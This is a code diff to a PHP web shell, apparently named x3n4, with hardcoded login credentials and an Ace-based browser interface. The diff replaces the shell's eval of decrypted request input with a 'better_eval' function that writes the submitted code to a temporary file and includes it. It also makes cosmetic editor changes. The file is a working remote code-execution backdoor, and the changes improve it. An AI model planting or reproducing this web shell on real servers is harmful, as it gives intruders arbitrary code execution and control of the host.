@@ -6,6 +6,10 @@ define('X3N4_ENCRYPTION_ALGORITHM', 'rb64');
 $user = 'x3n4';
 $password = 'P455W0rd';
 
+$hello_world = "<?php 
+echo 'hello world';
+?>";
+
 /**
  * Functions
  */
@@ -189,6 +193,21 @@ function get_user()
     }
     return getenv('USERNAME') ? getenv('USERNAME') : getenv('USER');
 }
+function better_eval($code) {
+    $temp = tmpfile ();
+    $file = stream_get_meta_data ( $temp );
+    $file = $file ['uri'];
+    fwrite ( $temp, $code );
+    ob_start();
+    include ($file);
+    $output = ob_get_contents();
+    ob_get_clean();
+    fclose ( $temp );
+    if(file_exists($file)){
+        unlink($file);
+    }
+    return $output;
+}
 
 /**
  * CORE
@@ -240,11 +259,9 @@ if (isset($_REQUEST['cmd'])) {
  * PHP Eval
  */
 if (isset($_REQUEST['eval'])) {
+    $code = decrypt($_REQUEST['eval']);
     $t1 = microtime(true);
-    ob_start();
-    $output = @eval(stripslashes(decrypt($_REQUEST['eval'])));
-    $output .= ob_get_contents();
-    ob_end_clean();
+    $output = better_eval($code);
     $t2 = microtime(true);
     output_json(array(
         'stdout' => $output,
@@ -379,8 +396,7 @@ if (isset($_REQUEST['eval'])) {
             </div>
 
             <div id="php-eval" role="tabpanel" class="tab-pane">
-                <textarea id="php-code" class="form-control"><?php echo "// ?><?php // place your code here
-echo 'hello world';"; ?></textarea>
+                <textarea id="php-code" class="form-control"><?php echo $hello_world; ?></textarea>
                 <p class="clearfix">
                     <button type="button" class="btn btn-default pull-right" id="btnEval"><i class="fa fa-play"></i> Run</button>
                     <span id="eval-time-took"></span>
@@ -396,11 +412,14 @@ echo 'hello world';"; ?></textarea>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.2.8/ace.js"></script>
     <script>
-        window.editorPhp = ace.edit('php-code');
-        window.editorPhp.setTheme('ace/theme/monokai');
-        window.editorPhp.getSession().setMode('ace/mode/php');
-        window.editorPhp.getSession().setUseWrapMode(true);
-        window.editorPhp.resize(true);
+        window.php_code = ace.edit('php-code');
+        window.php_code.setTheme('ace/theme/monokai');
+        window.php_code.getSession().setMode('ace/mode/php');
+        window.php_code.getSession().setUseWrapMode(true);
+        window.php_code.resize(true);
+        window.php_code.setOptions({
+            fontSize: "11pt"
+        });
     </script>
 
     <script>
@@ -486,7 +505,6 @@ echo 'hello world';"; ?></textarea>
                 $.post(this.script_path, {eval: this.encrypt(code)}, function(data) {
                     var evaltime = Date.now() - evalt1;
                     data = JSON.parse(that.decrypt(data));
-                    console.log(data);
                     if (data.stdout) {
                         $('#php-stdout').html(data.stdout);
                     } else {
@@ -501,8 +519,8 @@ echo 'hello world';"; ?></textarea>
             }
             this.clickEval = function () {
                 var code = '';
-                if (window.editorPhp) {
-                    code = window.editorPhp.getValue();
+                if (window.php_code) {
+                    code = window.php_code.getValue();
                 } else {
                     code = $('#php-code').val();
                 }
